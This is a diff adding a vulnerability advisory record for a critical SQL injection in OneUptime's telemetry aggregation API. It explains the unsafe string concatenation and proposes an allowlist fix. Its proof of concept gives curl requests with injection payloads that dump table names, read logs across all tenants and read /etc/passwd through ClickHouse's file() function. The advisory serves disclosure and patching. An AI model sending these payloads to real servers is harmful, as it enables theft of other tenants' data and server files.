@@ -1,0 +1,291 @@
+advisory_id: GHSA-p5g2-jm85-8g35
+datasource_id: github_osv/GHSA-p5g2-jm85-8g35
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p5g2-jm85-8g35/GHSA-p5g2-jm85-8g35.json
+aliases:
+  - CVE-2026-32306
+summary: |
+  OneUptime ClickHouse SQL Injection via Aggregate Query Parameters
+  ### Summary
+
+  The telemetry aggregation API accepts user-controlled `aggregationType`, `aggregateColumnName`, and `aggregationTimestampColumnName` parameters and interpolates them directly into ClickHouse SQL queries via the `.append()` method (documented as "trusted SQL"). There is no allowlist, no parameterized query binding, and no input validation. An authenticated user can inject arbitrary SQL into ClickHouse, enabling full database read (including telemetry data from all tenants), data modification, and potential remote code execution via ClickHouse table functions.
+
+  ### Details
+
+  **Entry Point — `Common/Server/API/BaseAnalyticsAPI.ts:88-98, 292-296`:**
+
+  The `POST /{modelName}/aggregate` route deserializes `aggregateBy` directly from the request body:
+
+  ```typescript
+  // BaseAnalyticsAPI.ts:292-296
+  const aggregateBy: AggregateBy<TBaseModel> = JSONFunctions.deserialize(
+      req.body["aggregateBy"]
+  ) as AggregateBy<TBaseModel>;
+  ```
+
+  No schema validation is applied to `aggregateBy`. The object flows directly to the database service.
+
+  **No Validation — `Common/Server/Services/AnalyticsDatabaseService.ts:276-278`:**
+
+  ```typescript
+  // AnalyticsDatabaseService.ts:276-278
+  if (aggregateBy.aggregationType) {
+      // Only truthiness check — no allowlist
+  }
+  ```
+
+  The `aggregationType` field is only checked for existence, never validated against an allowed set of values (e.g., `AVG`, `SUM`, `COUNT`).
+
+  **Raw SQL Injection — `Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts:527`:**
+
+  ```typescript
+  // StatementGenerator.ts:527
+  statement.append(
+      `${aggregationType}(${aggregateColumnName}) as aggregationResult`
+  );
+  ```
+
+  The `.append()` method on `Statement` (at `Statement.ts:149-151`) is documented as accepting **trusted SQL** and performs raw string concatenation:
+
+  ```typescript
+  // Statement.ts:149-151
+  public append(text: string): Statement {
+      this.query += text; // Raw concatenation — "trusted SQL"
+      return this;
+  }
+  ```
+
+  Similarly, `aggregationTimestampColumnName` is injected into GROUP BY clauses at `AnalyticsDatabaseService.ts:604-606`:
+
+  ```typescript
+  statement.append(
+      `toStartOfInterval(${aggregationTimestampColumnName}, ...)`
+  );
+  ```
+
+  **Attack flow:**
+  1. Authenticated user sends `POST /api/log/aggregate` (or `/api/span/aggregate`, `/api/metric/aggregate`)
+  2. Request body contains `aggregateBy.aggregationType` set to a SQL injection payload
+  3. Payload passes truthiness check at line 276
+  4. Payload is concatenated into SQL via `.append()` at line 527
+  5. ClickHouse executes the injected SQL
+
+  ### PoC
+
+  ```bash
+  # Step 1: Authenticate and get session token
+  TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"user@example.com","password":"password123"}' \
+    | jq -r '.token')
+
+  # Step 2: Extract data from ClickHouse system tables via UNION injection
+  curl -s -X POST 'https://TARGET/api/log/aggregate' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -H 'tenantid: PROJECT_ID' \
+    -d '{
+      "aggregateBy": {
+        "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT name FROM system.tables WHERE database = '\''oneuptime'\'' --",
+        "aggregateColumnName": "serviceId",
+        "aggregationTimestampColumnName": "createdAt"
+      },
+      "query": {}
+    }'
+
+  # Step 3: Read telemetry data across all tenants
+  curl -s -X POST 'https://TARGET/api/log/aggregate' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -H 'tenantid: PROJECT_ID' \
+    -d '{
+      "aggregateBy": {
+        "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT body FROM Log LIMIT 100 --",
+        "aggregateColumnName": "serviceId",
+        "aggregationTimestampColumnName": "createdAt"
+      },
+      "query": {}
+    }'
+
+  # Step 4: Read files via ClickHouse table functions (if enabled)
+  curl -s -X POST 'https://TARGET/api/log/aggregate' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -H 'tenantid: PROJECT_ID' \
+    -d '{
+      "aggregateBy": {
+        "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT * FROM file('\''/etc/passwd'\'') --",
+        "aggregateColumnName": "serviceId",
+        "aggregationTimestampColumnName": "createdAt"
+      },
+      "query": {}
+    }'
+  ```
+
+  ```bash
+  # Verify the vulnerability in source code:
+
+  # 1. No allowlist for aggregationType:
+  grep -n 'aggregationType' Common/Server/Services/AnalyticsDatabaseService.ts | head -5
+  # Line 276: if (aggregateBy.aggregationType) { — truthiness only
+
+  # 2. Raw SQL concatenation:
+  grep -n 'aggregationType.*aggregateColumnName' Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts
+  # Line 527: `${aggregationType}(${aggregateColumnName}) as aggregationResult`
+
+  # 3. .append() is raw concatenation:
+  grep -A3 'public append' Common/Server/Utils/AnalyticsDatabase/Statement.ts
+  # this.query += text; — "trusted SQL"
+
+  # 4. No validation at API layer:
+  grep -A5 'aggregateBy' Common/Server/API/BaseAnalyticsAPI.ts | grep -c 'validate\|sanitize\|allowlist'
+  # 0
+  ```
+
+  ### Impact
+
+  **Full ClickHouse database compromise.** An authenticated user (any role) can:
+
+  1. **Cross-tenant data theft** — Read telemetry data (logs, traces, metrics, exceptions) from ALL tenants/projects in the ClickHouse database, not just their own
+  2. **Data manipulation** — INSERT/ALTER/DROP tables in ClickHouse, destroying telemetry data for all users
+  3. **Server-side file read** — Via ClickHouse's `file()` table function (if not explicitly disabled), read arbitrary files from the ClickHouse container filesystem
+  4. **Remote code execution** — Via ClickHouse's `url()` table function, make HTTP requests from the server (SSRF), or via `executable()` table function, execute OS commands
+  5. **Credential theft** — ClickHouse default configuration (`default` user, password from env) could be leveraged to connect directly
+
+  The vulnerability requires only basic authentication (any registered user), making it exploitable at scale.
+
+  ### Proposed Fix
+
+  ```typescript
+  // 1. Add an allowlist for aggregationType in AnalyticsDatabaseService.ts:
+  const ALLOWED_AGGREGATION_TYPES = ['AVG', 'SUM', 'COUNT', 'MIN', 'MAX', 'UNIQ'];
+
+  if (!ALLOWED_AGGREGATION_TYPES.includes(aggregateBy.aggregationType.toUpperCase())) {
+      throw new BadRequestException(
+          `Invalid aggregationType: ${aggregateBy.aggregationType}. ` +
+          `Allowed: ${ALLOWED_AGGREGATION_TYPES.join(', ')}`
+      );
+  }
+
+  // 2. Validate aggregateColumnName against the model's known columns:
+  const modelColumns = model.getColumnNames(); // or similar accessor
+  if (!modelColumns.includes(aggregateBy.aggregateColumnName)) {
+      throw new BadRequestException(
+          `Invalid column: ${aggregateBy.aggregateColumnName}`
+      );
+  }
+
+  // 3. Same for aggregationTimestampColumnName:
+  if (aggregateBy.aggregationTimestampColumnName &&
+      !modelColumns.includes(aggregateBy.aggregationTimestampColumnName)) {
+      throw new BadRequestException(
+          `Invalid timestamp column: ${aggregateBy.aggregationTimestampColumnName}`
+      );
+  }
+
+  // 4. Use parameterized queries where possible:
+  statement.append(`{aggregationType:Identifier}({columnName:Identifier}) as aggregationResult`);
+  statement.addParameter('aggregationType', aggregateBy.aggregationType);
+  statement.addParameter('columnName', aggregateBy.aggregateColumnName);
+  ```
+impacted_packages:
+  - purl: pkg:npm/oneuptime
+    affected_versions: vers:npm/<10.0.23
+    fixed_versions: vers:npm/10.0.23
+    affected_packages:
+      - pkg:npm/oneuptime@4.0.3
+      - pkg:npm/oneuptime@4.0.5
+      - pkg:npm/oneuptime@4.0.6
+      - pkg:npm/oneuptime@4.0.7
+      - pkg:npm/oneuptime@4.0.8
+      - pkg:npm/oneuptime@4.0.9
+      - pkg:npm/oneuptime@4.0.10
+      - pkg:npm/oneuptime@4.0.11
+      - pkg:npm/oneuptime@4.0.12
+      - pkg:npm/oneuptime@4.0.13
+      - pkg:npm/oneuptime@4.0.14
+      - pkg:npm/oneuptime@4.0.15
+      - pkg:npm/oneuptime@4.0.16
+      - pkg:npm/oneuptime@4.0.17
+      - pkg:npm/oneuptime@4.0.18
+      - pkg:npm/oneuptime@4.0.19
+      - pkg:npm/oneuptime@4.0.20
+      - pkg:npm/oneuptime@4.0.21
+      - pkg:npm/oneuptime@4.0.22
+      - pkg:npm/oneuptime@4.0.23
+      - pkg:npm/oneuptime@4.0.24
+      - pkg:npm/oneuptime@4.0.25
+      - pkg:npm/oneuptime@4.0.26
+      - pkg:npm/oneuptime@4.0.27
+      - pkg:npm/oneuptime@4.0.28
+      - pkg:npm/oneuptime@4.0.29
+      - pkg:npm/oneuptime@4.0.30
+      - pkg:npm/oneuptime@4.0.31
+      - pkg:npm/oneuptime@4.0.32
+      - pkg:npm/oneuptime@4.0.33
+      - pkg:npm/oneuptime@4.0.34
+      - pkg:npm/oneuptime@4.0.35
+      - pkg:npm/oneuptime@4.0.36
+      - pkg:npm/oneuptime@4.0.37
+      - pkg:npm/oneuptime@4.0.38
+      - pkg:npm/oneuptime@4.0.39
+      - pkg:npm/oneuptime@4.0.40
+      - pkg:npm/oneuptime@4.0.41
+      - pkg:npm/oneuptime@4.0.42
+      - pkg:npm/oneuptime@4.0.43
+      - pkg:npm/oneuptime@4.0.44
+      - pkg:npm/oneuptime@4.0.45
+      - pkg:npm/oneuptime@4.0.46
+      - pkg:npm/oneuptime@4.0.47
+      - pkg:npm/oneuptime@4.0.48
+      - pkg:npm/oneuptime@4.0.49
+      - pkg:npm/oneuptime@4.0.50
+      - pkg:npm/oneuptime@4.0.51
+      - pkg:npm/oneuptime@4.0.52
+      - pkg:npm/oneuptime@4.0.53
+      - pkg:npm/oneuptime@4.0.54
+      - pkg:npm/oneuptime@4.0.55
+      - pkg:npm/oneuptime@4.0.56
+      - pkg:npm/oneuptime@4.0.57
+      - pkg:npm/oneuptime@4.0.58
+      - pkg:npm/oneuptime@4.0.59
+      - pkg:npm/oneuptime@4.0.60
+      - pkg:npm/oneuptime@4.0.61
+      - pkg:npm/oneuptime@4.0.62
+      - pkg:npm/oneuptime@4.0.63
+      - pkg:npm/oneuptime@4.0.64
+      - pkg:npm/oneuptime@4.0.65
+      - pkg:npm/oneuptime@4.0.66
+      - pkg:npm/oneuptime@4.0.67
+      - pkg:npm/oneuptime@4.0.68
+      - pkg:npm/oneuptime@4.0.69
+    fixed_packages:
+      - pkg:npm/oneuptime@10.0.23
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p5g2-jm85-8g35/GHSA-p5g2-jm85-8g35.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/OneUptime/oneuptime
+    reference_type:
+    reference_id:
+  - url: https://github.com/OneUptime/oneuptime/releases/tag/10.0.23
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-32306
+    reference_type:
+    reference_id: CVE-2026-32306
+  - url: https://github.com/OneUptime/oneuptime/security/advisories/GHSA-p5g2-jm85-8g35
+    reference_type:
+    reference_id: GHSA-p5g2-jm85-8g35
+exploits: []
